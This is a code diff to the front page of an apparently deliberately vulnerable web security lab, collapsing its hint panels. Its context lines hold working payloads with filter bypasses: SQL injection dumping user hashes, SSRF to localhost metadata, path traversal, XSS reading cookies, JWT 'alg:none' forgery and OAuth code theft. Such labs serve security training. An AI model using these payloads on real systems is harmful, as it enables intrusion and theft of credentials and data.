@@ -40,7 +40,7 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
   <p class="muted">Product search. The query has 3 columns. Enumerate <code>information_schema</code> → dump
      the <code>secrets</code> table (flag) and the <code>users</code> table (crackable MD5 hashes).</p>
   <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
-  <details open><summary>💡 hint — <span class="note" id="note_q"></span></summary><code class="pl" id="pl_q"></code>
+  <details><summary>💡 hint — <span class="note" id="note_q"></span></summary><code class="pl" id="pl_q"></code>
     <button type="button" class="ghost" onclick="fill('in_q','pl_q')">use this ▶</button>
     <code class="pl" id="pl_q2">zzz%' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -</code>
     <button type="button" class="ghost" onclick="fill('in_q','pl_q2')">dump users (easy) ▶</button></details>
@@ -54,7 +54,7 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
   <p class="muted">Log in to get a <code>session</code> JWT, then make yourself <code>role=admin</code>
      (<b>alg:none</b> or crack the weak HS256 secret). Edit the cookie in DevTools / jwt.io, then open account.</p>
   <div class="levels" id="lv_jwt"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('jwt','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('jwt','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('jwt','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('jwt','expert')">Expert</button></div>
-  <details open><summary>💡 hint — <span class="note" id="note_jwt"></span></summary><code class="pl" id="pl_jwt"></code></details>
+  <details><summary>💡 hint — <span class="note" id="note_jwt"></span></summary><code class="pl" id="pl_jwt"></code></details>
   <form method="post" action="login.php" target="r_jwt" onsubmit="show('r_jwt')">
     <input type="hidden" name="level" id="lvl_jwt" value="easy">
     <input type="text" id="in_u" name="username" placeholder="username" style="min-width:120px">
@@ -68,7 +68,7 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <div class="card"><h2>3 · <code>fetch.php?url=</code> <span class="flag-pill">🏁 SSRF</span></h2>
   <p class="muted">Server-side URL fetcher — no allow-list. Reach an internal service or a local file.</p>
   <div class="levels" id="lv_url"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('url','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('url','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('url','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('url','expert')">Expert</button></div>
-  <details open><summary>💡 hint — <span class="note" id="note_url"></span></summary><code class="pl" id="pl_url"></code>
+  <details><summary>💡 hint — <span class="note" id="note_url"></span></summary><code class="pl" id="pl_url"></code>
     <button type="button" class="ghost" onclick="fill('in_url','pl_url')">use this ▶</button></details>
   <form method="get" action="fetch.php" target="r_url" onsubmit="show('r_url')">
     <input type="hidden" name="level" id="lvl_url" value="easy">
@@ -80,7 +80,7 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
   <p class="muted">Imports an XML order. External entities are resolved → read local files. <i>(needs <code>php-xml</code>)</i></p>
   <div class="levels" id="lv_xml"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('xml','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('xml','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('xml','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('xml','expert')">Expert</button></div>
   <input type="hidden" id="lvl_xml" value="easy">
-  <details open><summary>💡 hint — <span class="note" id="note_xml"></span></summary><code class="pl" id="pl_xml"></code>
+  <details><summary>💡 hint — <span class="note" id="note_xml"></span></summary><code class="pl" id="pl_xml"></code>
     <button type="button" class="ghost" onclick="fill('in_xml','pl_xml')">use this ▶</button></details>
   <textarea id="in_xml" placeholder="paste an XML document…"></textarea>
   <div><button type="button" onclick="sendXml()">Send XML ▶</button></div>
@@ -90,7 +90,7 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <div class="card"><h2>5 · <code>download.php?file=</code> <span class="flag-pill">🏁 path traversal</span></h2>
   <p class="muted">Downloads a file from <code>docs/</code>. Escape it with <code>../</code>.</p>
   <div class="levels" id="lv_file"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('file','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('file','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('file','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('file','expert')">Expert</button></div>
-  <details open><summary>💡 hint — <span class="note" id="note_file"></span></summary><code class="pl" id="pl_file"></code>
+  <details><summary>💡 hint — <span class="note" id="note_file"></span></summary><code class="pl" id="pl_file"></code>
     <button type="button" class="ghost" onclick="fill('in_file','pl_file')">use this ▶</button></details>
   <form method="get" action="download.php" target="r_file" onsubmit="show('r_file')">
     <input type="hidden" name="level" id="lvl_file" value="easy">
@@ -101,7 +101,7 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 <div class="card"><h2>6 · <code>greet.php?name=</code> <span class="flag-pill">🏁 filtered XSS</span></h2>
   <p class="muted">Greeting with a naive filter that strips <code>&lt;script&gt;</code> once. Bypass it; the page sets a non-HttpOnly <code>flag</code> cookie.</p>
   <div class="levels" id="lv_name"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('name','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('name','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('name','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('name','expert')">Expert</button></div>
-  <details open><summary>💡 hint — <span class="note" id="note_name"></span></summary><code class="pl" id="pl_name"></code>
+  <details><summary>💡 hint — <span class="note" id="note_name"></span></summary><code class="pl" id="pl_name"></code>
     <button type="button" class="ghost" onclick="fill('in_name','pl_name')">use this ▶</button></details>
   <form method="get" action="greet.php" target="r_name" onsubmit="show('r_name')">
     <input type="hidden" name="level" id="lvl_name" value="easy">
@@ -113,7 +113,7 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
   <p class="muted">OAuth authorize endpoint. The <code>redirect_uri</code> isn't validated, so the victim's
      auth <code>code</code> can be sent to a host you control → replay it at <code>oauth_callback.php?code=</code>.</p>
   <div class="levels" id="lv_rd"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('rd','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('rd','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('rd','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('rd','expert')">Expert</button></div>
-  <details open><summary>💡 hint — <span class="note" id="note_rd"></span></summary><code class="pl" id="pl_rd"></code>
+  <details><summary>💡 hint — <span class="note" id="note_rd"></span></summary><code class="pl" id="pl_rd"></code>
     <button type="button" class="ghost" onclick="fill('in_rd','pl_rd')">use this ▶</button>
     <span class="muted"> · the issued <code>code=</code> (in the redirect) is bound to “admin” → replay at <code>oauth_callback.php?code=</code></span></details>
   <form method="get" action="oauth_authorize.php" target="r_rd" onsubmit="show('r_rd')">
@@ -131,7 +131,7 @@ const PAYLOADS={
  q:{easy:{p:"zzz%' UNION SELECT k,v,3 FROM secrets-- -",n:"Easy — raw UNION."},medium:{p:"zzz%' UNIunionON SELselectECT k,v,3 FROM secrets-- -",n:"Medium — union/select stripped once → nest (UNIunionON)."},hard:{p:"zzz%'/**/UNIunionON/**/SELselectECT/**/k,v,3/**/FROM/**/secrets#",n:"Hard — + spaces stripped → /**/ and end with #."},expert:{p:"zzz' OR 1=1-- -",n:"Expert — BLIND (match/no match). Boolean-extract the flag char by char."}},
  url:{easy:{p:"http://127.0.0.1:8001/metadata.php",n:"Easy — no filter."},medium:{p:"http://127.1:8001/metadata.php",n:"Medium — 127.0.0.1/localhost blocked → 127.1 (or decimal/octal)."},hard:{p:"http://2130706433:8001/metadata.php",n:"Hard — 127. and 0.0.0.0 blocked → decimal IP 2130706433 (or hex/octal)."},expert:{p:"http://0177.0.0.1:8001/metadata.php",n:"Expert — decimal/hex/file:// blocked → octal 0177.0.0.1."}},
  file:{easy:{p:"../private2/secret_config.txt",n:"Easy — raw ../."},medium:{p:"....//private2/secret_config.txt",n:"Medium — ../ stripped once → ....// (one is enough; docs/ is one level deep)."},hard:{p:"....//private2/secret_config.txt",n:"Hard — + must end .txt/.conf/.md (it does)."},expert:{p:"php://filter/convert.base64-encode/resource=private2/secret_config.txt",n:"Expert — traversal blocked → php://filter wrapper, then base64-decode."}},
- name:{easy:{p:"<script>alert(document.cookie)</script>",n:"Easy — raw."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — <script stripped → <img onerror>."},hard:{p:"<details open ontoggle=alert(document.cookie)>",n:"Hard — onerror/onload stripped → ontoggle."},expert:{p:"<input autofocus onfocus=alert(document.cookie)>",n:"Expert — ontoggle stripped → autofocus+onfocus."}}
+ name:{easy:{p:"<script>alert(document.cookie)<\/script>",n:"Easy — raw."},medium:{p:"<img src=x onerror=alert(document.cookie)>",n:"Medium — <script stripped → <img onerror>."},hard:{p:"<details open ontoggle=alert(document.cookie)>",n:"Hard — onerror/onload stripped → ontoggle."},expert:{p:"<input autofocus onfocus=alert(document.cookie)>",n:"Expert — ontoggle stripped → autofocus+onfocus."}}
 };
 PAYLOADS.jwt={
  easy:{p:"Forge a token: header {\"alg\":\"none\"}, payload {\"user\":\"alice\",\"role\":\"admin\"}, empty signature (keep the trailing dot). Set it as the 'session' cookie, then open account.php.",n:"Easy — alg:none is accepted."},
